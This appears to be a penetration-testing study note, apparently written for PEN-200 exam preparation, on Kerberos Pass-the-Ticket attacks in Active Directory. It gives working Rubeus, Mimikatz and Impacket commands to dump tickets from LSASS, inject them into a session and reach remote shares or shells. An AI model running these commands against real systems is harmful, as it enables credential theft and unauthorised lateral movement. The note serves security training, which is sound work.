# Pass-the-Ticket

**If you land on a machine where a privileged user has Kerberos tickets in memory, you may be able to export and reuse those tickets without knowing the user's password.** The ticket only gives you the access encoded for that Kerberos identity/service.

```text
Existing privileged Kerberos session
        ↓
find/export TGT/TGS
        ↓
inject ticket into your logon session
        ↓
access the ticket's permitted Kerberos service
```

---

## Windows — Rubeus

```powershell
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:<LUID> /service:krbtgt /nowrap
.\Rubeus.exe ptt /ticket:<BASE64_TICKET>

klist
dir \\<TARGET_FQDN>\C$
```

---

## Windows — Mimikatz workflow from PEN-200

Export the tickets found in LSASS:

```text
privilege::debug
sekurlsa::tickets /export
```

Mimikatz writes tickets to disk as `.kirbi` files. Identify a ticket matching the service you want, for example:

```text
<USER>@cifs-<TARGET>.kirbi
```

Inject it into the current session:

```text
kerberos::ptt <TICKET>.kirbi
```

Verify the imported ticket:

```powershell
klist
```

Then access the matching service/resource:

```powershell
dir \\<TARGET>\<SHARE>
```

PEN-200 demonstrates injecting another user's **CIFS TGS** and then accessing that user's restricted SMB share.

---

## TGT vs TGS — exam mental model

```text
TGT (krbtgt/...)
  → identity's ticket-granting credential
  → can be used to request service tickets

TGS (cifs/server, http/server, ...)
  → scoped to a specific service/SPN
  → directly useful only for that service
```

A stolen `cifs/<HOST>` ticket does **not** automatically mean you can use every Kerberos service on that machine.

PEN-200 emphasizes that exported service tickets can be re-injected into another session. If the ticket already belongs to your current user, using it does not inherently require administrative privileges; obtaining another user's tickets from LSASS does require the access needed to read LSASS.

---

## Linux

If you already have a compatible `.ccache` ticket:

```bash
export KRB5CCNAME=/tmp/ticket.ccache
impacket-psexec -k -no-pass <DOMAIN>/<USER>@<TARGET_FQDN>
```

Other Kerberos-aware Impacket tools can use the same `KRB5CCNAME` context.

---

## Troubleshooting

```text
Ticket injected but access denied?
├─ Is the ticket expired?
├─ Does the SPN match the service you are accessing?
├─ Are you using the hostname/FQDN so Kerberos is selected?
├─ Does DNS resolve the target correctly?
└─ Is system time close enough to the DC?
```

See [[Overpass-the-Hash]] and [[Active Directory/AD Authentication — NTLM, Kerberos & LSASS|AD Authentication — NTLM, Kerberos & LSASS]].
